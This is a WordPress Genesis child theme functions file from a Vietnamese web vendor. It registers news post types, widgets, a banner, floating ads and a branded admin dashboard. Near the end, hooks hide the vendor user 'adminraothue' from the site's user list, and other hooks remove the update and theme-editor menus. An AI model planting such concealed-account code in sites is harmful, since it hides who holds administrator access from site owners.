<?php
//* Start the engine
include_once( get_template_directory() . '/lib/init.php' );
require_once(STYLESHEETPATH.'/lib/rt-init.php');
//* Child theme (do not remove)
define( 'CHILD_THEME_NAME', 'RT Normal' );
define( 'CHILD_THEME_URL', 'http://thietkewebmienphi.com' );
define( 'CHILD_THEME_VERSION', '1.0' );
//check mobile
require_once(STYLESHEETPATH.'/lib/rt-mobile/Mobile_Detect.php');
$detect = new Mobile_Detect;
	// if ( $detect->isMobile() ) {
	// } // end check mobile

//* Add HTML5 markup structure
add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );
/* fix web no mobile */
function add_meta_head() {
?>
<meta name="viewport" content="width=1020">
<?php
}
add_action('genesis_meta','add_meta_head');

// Add viewport meta tag for mobile browsers
//add_theme_support( 'genesis-responsive-viewport' );


//* Add support for custom background
add_theme_support( 'custom-background' );

// remove meta version wp
remove_action('wp_head', 'wp_generator');

// Add image header
remove_action( 'genesis_site_description', 'genesis_seo_site_description' );
// remove menu if is not admin
add_action( 'admin_menu', 'remove_menu_user', 999);
function remove_menu_user(){
	if(!current_user_can('administrator')){
	remove_menu_page('wpcf7');
	remove_menu_page('genesis');
	remove_menu_page('dd_button_setup');
	remove_menu_page('wpseo_dashboard');
	remove_menu_page('edit.php?post_type=acf');
	remove_menu_page( 'options-general.php' );
	}
}

function changestring($string){
	if($string != ''){
	$ex_string = explode("wp-content", $string);
	return get_bloginfo('url')."/wp-content".$ex_string[1];
	}
}
// add favicon 
function add_favicon(){
	$favicon = gtid_get_option('rt_image_favicon');
	$imgfavicon = changestring($favicon);
	if( preg_match("/\.(png|gif|jpeg|ico|jpg)$/",$favicon) ){
	echo  "<link rel='shortcut icon' href='$imgfavicon' />";
	}
	else{
	echo "<link rel='shortcut icon' href='".get_stylesheet_directory_uri()."/images/favicon.ico' />";
	}
}
add_filter( 'genesis_pre_load_favicon', 'add_favicon' );

// add clear both
function add_clear(){
	echo "<div class='clear'></div>";
}
add_action("genesis_before_footer","add_clear",1);

// Add Image Header
function add_image_header() {
	$url = gtid_get_option('rt_image_banner');
	$linkurl = changestring($url);
	$linkhome = get_option('siteurl');
	if(!empty($linkurl))
	echo "<a class='imgbanner' href='{$linkhome}' title='".get_bloginfo('name')."'><img src='{$linkurl}' alt='".get_bloginfo('name')."' /></a>";
}
add_action('genesis_header','add_image_header');

// Add slide
function add_slide() {
	if(is_home()) {
	$idsl = gtid_get_option( 'rt_slider_home' );
	echo do_shortcode( "[metaslider id={$idsl}]" );
	}
}
add_action ('genesis_before_content_sidebar_wrap','add_slide');
//add link raothue
add_action('genesis_footer','add_raothue_link');
function add_raothue_link(){
	echo "<p id='credit-link'><a rel='nofollow' target='_blank' href='http://thietkewebmienphi.com/' title='thiet ke website' >
	<strong>Thiết Kế bởi RT</strong></a></p><p id='back-top'> <a href='#top'><span></span></a> </p>";
}

// Remove Menu
function remove_menus(){
	//remove_menu_page( 'index.php' );                  //Dashboard
	//remove_menu_page( 'edit.php' );                   //Posts
	//remove_menu_page( 'upload.php' );                 //Media
	//remove_menu_page( 'edit.php?post_type=page' );    //Pages
	remove_menu_page( 'edit-comments.php' );          //Comments
	//remove_menu_page( 'themes.php' );                 //Appearance
	//remove_menu_page( 'plugins.php' );
	//remove_menu_page( 'update-core.php' );                  //Plugins
	//remove_menu_page( 'users.php' );                  //Users
	//remove_menu_page( 'tools.php' );                  //Tools
	// remove_menu_page( 'options-general.php' );        //Settings

}
add_action( 'admin_menu', 'remove_menus' );

add_action( 'admin_menu', 'my_remove_menus',999);
function my_remove_menus() {
	remove_submenu_page( 'index.php', 'update-core.php' ); // Update
	remove_submenu_page( 'themes.php', 'theme-editor.php' ); // Theme editor
	remove_submenu_page( 'themes.php', 'customize.php' ); // Customize
	remove_submenu_page( 'themes.php', 'themes.php' ); // Customize
	//remove_submenu_page( 'users.php', 'users-user-role-editor.php' );
	remove_submenu_page( 'options-general.php', 'settings-user-role-editor.php' );
}

// Remove logo admin
function remove_wp_admin_bar_logo() {
		global $wp_admin_bar;
		$wp_admin_bar->remove_menu('wp-logo');
}
add_action('wp_before_admin_bar_render', 'remove_wp_admin_bar_logo', 0);

/* an bang dieu khien thua` */
function remove_dashboard_widgets(){
global$wp_meta_boxes;
unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);
unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_activity']);
unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
unset($wp_meta_boxes['dashboard']['normal']['core']['social4i_admin_widget']);
}
add_action('wp_dashboard_setup', 'remove_dashboard_widgets');

// remove widget mac dinh
add_action( 'widgets_init', 'my_unregister_widgets' );
function my_unregister_widgets() {
	unregister_widget('WP_Widget_Pages');
	unregister_widget('WP_Widget_Calendar');
	unregister_widget('WP_Widget_Archives');
	unregister_widget('WP_Widget_Links');
	unregister_widget('WP_Widget_Meta');
	unregister_widget('WP_Widget_Categories');
	unregister_widget('WP_Widget_Recent_Posts');
	unregister_widget('WP_Widget_Recent_Comments');
	unregister_widget('WP_Widget_RSS');
	unregister_widget('Genesis_Featured_Page');
	unregister_widget('Genesis_Featured_Post');
	unregister_widget('Genesis_User_Profile_Widget');
}

add_action('wp_dashboard_setup', 'my_custom_dashboard_widgets',1,2);
function my_custom_dashboard_widgets() {
	global $wp_meta_boxes;
	wp_add_dashboard_widget('custom_help_widget', 'Thông tin Hệ Thống Admin', 'custom_dashboard_help');
}

	function custom_dashboard_help() {
	echo '<p style="font-size:15px;line-height:1.5">Chào mừng Quý khách đến với hệ thống Quản Trị Website.<br/>
	Hệ thống được phát triển bởi <strong>RaoThue</strong> trên nền tảng <strong>Wordpress</strong>.<br />
	Để xem hướng dẫn quản trị website, vui lòng xem tại link sau : <a target="_blank" href="http://www.hocquantri.net/quantriweb/">Hướng dẫn quản trị Website</a> <br />
	Mọi thắc mắc, lỗi trong quá trình sử dụng Quý khách hàng có thể liên hệ bộ phận Kỹ Thuật :<br/>
	<strong>Điện thoại </strong>: 04. 66 800 900 ( giờ hành chính )<br/>
	<strong>Email</strong>: web@raothue.com <br/>
	<strong>Web</strong>: <a href="http://webrt.vn/">Webrt.vn - raothue.com</a><br/>
	Cảm ơn quý khách đã tin tưởng và sử dụng sản phẩm của chúng tôi.
	</p>';
}

// Fix Seo by yoast
add_filter( 'wpseo_canonical', '__return_false' );


/*-----------------------------------------------------------------------------------*/
/* Custom post type Tin-tuc
/*-----------------------------------------------------------------------------------*/
add_action('init', 'cptui_register_my_cpt_tin_tuc');
function cptui_register_my_cpt_tin_tuc() {
register_post_type('tin-tuc', array(
'label' => 'Tin tức',
'description' => '',
'public' => true,
'show_ui' => true,
'show_in_menu' => true,
'capability_type' => 'post',
'map_meta_cap' => true,
'hierarchical' => false,
'rewrite' => array('slug' => 'tin-tuc', 'with_front' => true),
'query_var' => true,
'supports' => array('title','editor','excerpt','trackbacks','custom-fields','comments','revisions','thumbnail','author','page-attributes','post-formats'),
'labels' => array (
	'name' => 'Tin tức',
	'singular_name' => 'Tin tức',
	'menu_name' => 'Tin tức',
	'add_new' => 'Đăng tin',
	'add_new_item' => 'Đăng tin',
	'edit' => 'Sửa',
	'edit_item' => 'Sửa',
	'new_item' => 'Đăng tin',
	'view' => 'Xem tin',
	'view_item' => 'Xem tin',
	'search_items' => 'Tìm',
	'not_found' => 'Không thấy',
	'not_found_in_trash' => 'Không thấy',
	'parent' => 'Cha',
)
) ); }

// Add danh muc tin

add_action('init', 'cptui_register_my_taxes_danhmuc');
function cptui_register_my_taxes_danhmuc() {
register_taxonomy( 'danhmuc',array (
	0 => 'tin-tuc',
),
array( 'hierarchical' => true,
	'label' => 'Danh mục tin',
	'show_ui' => true,
	'query_var' => true,
	'show_admin_column' => true,
	'labels' => array (
	'search_items' => 'Danh mục tin',
	'popular_items' => 'Nổi bật',
	'all_items' => 'Tất cả',
	'parent_item' => 'Cha',
	'parent_item_colon' => 'Cha',
	'edit_item' => 'Sửa',
	'update_item' => 'Cập nhật',
	'add_new_item' => 'Thêm',
	'new_item_name' => 'Thêm',
	'separate_items_with_commas' => 'Cách nhau bằng dấu phẩy',
	'add_or_remove_items' => 'Thêm hoặc xóa',
	'choose_from_most_used' => 'Chọn nổi bật nhất',
)
) );
}

// add filter danhmuc in admin
function restrict_books_by_genre() {
	global $typenow;
	$post_type = 'tin-tuc'; // change HERE
	$taxonomy = 'danhmuc'; // change HERE
	if ($typenow == $post_type) {
		$selected = isset($_GET[$taxonomy]) ? $_GET[$taxonomy] : '';
		$info_taxonomy = get_taxonomy($taxonomy);
		wp_dropdown_categories(array(
		'show_option_all' => __("Hiển thị tất cả"),
		'taxonomy' => $taxonomy,
		'name' => $taxonomy,
		'orderby' => 'name',
		'selected' => $selected,
		'show_count' => true,
		'hide_empty' => true,
		));
	};
	}
add_action('restrict_manage_posts', 'restrict_books_by_genre');

function convert_id_to_term_in_query($query) {
	global $pagenow;
	$post_type = 'tin-tuc'; // change HERE
	$taxonomy = 'danhmuc'; // change HERE
	$q_vars = &$query->query_vars;
	if ($pagenow == 'edit.php' && isset($q_vars['post_type']) && $q_vars['post_type'] == $post_type && isset($q_vars[$taxonomy]) && is_numeric($q_vars[$taxonomy]) && $q_vars[$taxonomy] != 0) {
	$term = get_term_by('id', $q_vars[$taxonomy], $taxonomy);
	$q_vars[$taxonomy] = $term->slug;
	}
}
add_filter('parse_query', 'convert_id_to_term_in_query');

//* Remove comment form allowed tags

remove_action( 'genesis_after_post', 'genesis_get_comments_template' );
//* Customize the credits
add_filter( 'genesis_footer_creds_text', 'sp_footer_creds_text' );
function sp_footer_creds_text() {
echo '';
}

// Remove Widget

function remove_widgets() {
	if(current_user_can('activate_plugins')) {
	unregister_widget('WP_Widget_Meta' );

	}
}

//Add Footer widget
add_theme_support('genesis-footer-widgets',3); // add number widget in footer
remove_action('genesis_after_header','genesis_do_subnav');
remove_action('genesis_footer','genesis_do_footer');

// Add tin tức ở widget
add_filter('widget_posts_args', 'widget_posts_args_add_custom_type');
function widget_posts_args_add_custom_type($params) {
$params['post_type'] = array('tin-tuc');
return $params;
}
/*Menu mobile*/
// if ( $detect->isMobile() ) {
// 	function insert_menumobile() {
// 		echo '<button class="secondary-toggle"></button>';
// 	}
// 	add_action( 'genesis_header','insert_menumobile' );
// 	function add_slider_js2() {
// 		wp_enqueue_script( "menumobile", CHILD_URL."/lib/js/mobile.js", array( "jquery" ) );
// 	}
// 	if( !is_admin() ) {
// 		add_action( "wp_enqueue_scripts", "add_slider_js2" );
// 	}
// }

// if ( $detect->isMobile() ) {

// } else {
	/* add css */
	function add_slider_css() {
		 wp_enqueue_style( "res", CHILD_URL."/res.css" );
		wp_enqueue_style( "support-css", CHILD_URL."/lib/css/support.css" );
		wp_register_style( "logo-slide", CHILD_URL."/lib/css/logo-slide.css" );
	}
	if( !is_admin() ) {
		add_action( "wp_enqueue_scripts", "add_slider_css" );
	}

	/* add js */
	function add_slider_js() {
		wp_enqueue_script( "backtop", CHILD_URL."/lib/js/backtop.js", array( "jquery" ) );
		// slider logo + product
		wp_register_script('jquery.easing-1.3', CHILD_URL.'//lib/js2/jquery.easing-1.3.js', array('jquery'), '1.0.1');
		wp_register_script('jquery.mousewheel', CHILD_URL.'//lib/js2/jquery.mousewheel-3.1.12.js', array('jquery'), '1.0.1');
		wp_register_script('jquery.jcarousellite', CHILD_URL.'//lib/js2/jquery.jcarousellite.js', array('jquery'), '1.0.1');
		wp_register_script('slide-js', CHILD_URL.'//lib/js2/slide.js', array('jquery'), '1.0.1');
		
		wp_register_script( "rt-adv-float", CHILD_URL."/lib/js/floatads.min.js", array(), "1.0", false );
		if ( gtid_get_option('rt_adv') == 1 ) wp_enqueue_script( "rt-adv-float" );
	}
	if( !is_admin() ) {
	add_action( "wp_enqueue_scripts", "add_slider_js" );
	}

	// Add Custom Css to Admin

	add_action('admin_head', 'my_custom_css');

	function my_custom_css() {
	echo '<link rel="stylesheet" href="'.get_stylesheet_directory_uri().'/lib/css/admin.css" type="text/css" media="all" />';
	}
	// adv float left and right
	function rt_adv_leftright() {
	if ( gtid_get_option('rt_adv') != 1 ) return false;

	$rt_content_w = gtid_get_option( 'rt_adv_content_w' );
	$screen_w = gtid_get_option( 'rt_adv_screen_w' );

	$leftw = gtid_get_option( 'rt_adv_leftw' );
	$lefth = gtid_get_option( 'rt_adv_lefth' );
	$leftlink = gtid_get_option( 'rt_adv_leftlink' );
	$leftsource = gtid_get_option( 'rt_adv_leftsource' ) ? gtid_get_option( 'rt_adv_leftsource' ) : THEME_URI.'/images/rt-left.jpg';

	$rightw = gtid_get_option( 'rt_adv_rightw' );
	$righth = gtid_get_option( 'rt_adv_righth' );
	$rightlink = gtid_get_option( 'rt_adv_rightlink' );
	$rightsource = gtid_get_option( 'rt_adv_rightsource' ) ? gtid_get_option( 'rt_adv_rightsource' ) : THEME_URI.'/images/rt-right.jpg';

	$margint = gtid_get_option( 'rt_adv_margint' );
	$marginl = gtid_get_option( 'rt_adv_marginl' );
	$marginr = gtid_get_option( 'rt_adv_marginr' );

	$rt_follow = gtid_get_option( 'rt_adv_follow' );
	$rt_newtab = gtid_get_option( 'rt_adv_newtab' );

	if ( $rt_follow == 1 ) $fl = 'rel="nofollow"';
	if ( $rt_newtab == 1 ) $nt = 'target="_blank"';

	?>
	<script type="text/javascript">
		var clientWidth = window.screen.width;
		if(clientWidth >= <?php echo $screen_w; ?>){
			document.write('<div id="divAdRight" style="position: absolute; top: 0px; width:<?php echo $rightw; ?>px; <?php if($righth) echo "height:".$righth."px;"; ?> overflow:hidden;"><a href="<?php echo $rightlink ?>" title="adv-right" <?php if ($fl) echo $fl; if ($nt) echo $nt ?>><img src="<?php echo $rightsource ?>" /></a></div><div id="divAdLeft" style="position: absolute; top: 0px; width:<?php echo $leftw; ?>px; <?php if($lefth) echo "height:".$lefth."px;"; ?> overflow:hidden;"><a href="<?php echo $leftlink ?>" title="adv-left" <?php if ($fl) echo $fl; if ($nt) echo $nt ?>><img src="<?php echo $leftsource ?>" /></a></div>');

			var MainContentW = <?php echo $rt_content_w; ?>;
			var LeftBannerW = <?php echo $leftw; ?>;
			var RightBannerW = <?php echo $rightw; ?>;
			var LeftAdjust = <?php echo $marginl; ?>;
			var RightAdjust = <?php echo $marginr; ?>;
			var TopAdjust = <?php echo $margint; ?>;
			ShowAdDiv();
			window.onresize=ShowAdDiv;
		}
	</script>
	<?php
	}
	add_action( 'wp_footer', 'rt_adv_leftright' );
// } // end check mobile javascrip

// hide admin css
if( is_admin() ) {
	add_action('admin_head','yoursite_pre_user_css');
}
function yoursite_pre_user_css($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ($username != 'adminraothue') {
	wp_enqueue_style( "admin-css", CHILD_URL."/lib/css/adminuser.css" );
	}
}
	// hide admin
if( is_admin() ) {
	add_action('pre_user_query','yoursite_pre_user_query');
}
	function yoursite_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ($username != 'adminraothue') {
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1',
		"WHERE 1=1 AND {$wpdb->users}.user_login != 'adminraothue'",$user_search->query_where);
	}
	}
	
//Add new chan trang
if ( function_exists('register_sidebar') ){
	register_sidebar(array(
		'name' => 'single widget',
		'before_widget' => '<div id="%1$s" class="widget %2$s"> ',
		'after_widget' => '</div>',
		'before_title' => '<h4>',
		'after_title' => '</h4>',

));
}

/**
 *
 * Render the shortcode
 *
 * @param  array $atts Shortcode post
 * @return  
 *
 */
if ( ! function_exists( 'rt_creat_query_loop' ) ) {
	function rt_creat_query_loop( $atts, $content = '', $post_class = array()) {
	extract( shortcode_atts( array(
		'idpost'    => '',
		'showposts'    => '',
		'posttype'     =>'',
		'taxonomy'     =>'',
		'class'        =>''
	), $atts ) );
		$main_post = new WP_Query(array(
						'post_type' => $posttype,
						'tax_query' => array(
							array(
								'taxonomy' => $taxonomy,
								'field'     => 'id',
								'terms' => $idpost
							)
						),
						'paged'=> get_query_var('paged'),
						 'showposts' => $showposts
						));
	?>
		<ul class="product-list <?php echo $class; ?>">
			<?php 
				while($main_post->have_posts()):
				$main_post->the_post();
				if ( $taxonomy != 'danhmuc' ){
				get_template_part('inc/loop-product');
				}else{
				get_template_part('inc/loop-new');
				}
				endwhile; 
				wp_reset_postdata();
			?> 
		</ul>
	<?php
	} // end function
	add_shortcode( 'rt_creat_query', 'rt_creat_query_loop' );
} // end query loop

/**
 * Add Thumb Size
**/
add_image_size( 'rt_thumb600x300', 600, 300, array( 'center', 'center' ) );

add_image_size( 'rt_thumb150x120', 150, 120, array( 'center', 'center' ) );
add_image_size( 'rt_thumb310x195', 310, 195, array( 'center', 'center' ) );
add_image_size( 'rt_thumb67x46', 67, 46, array( 'center', 'center' ) );

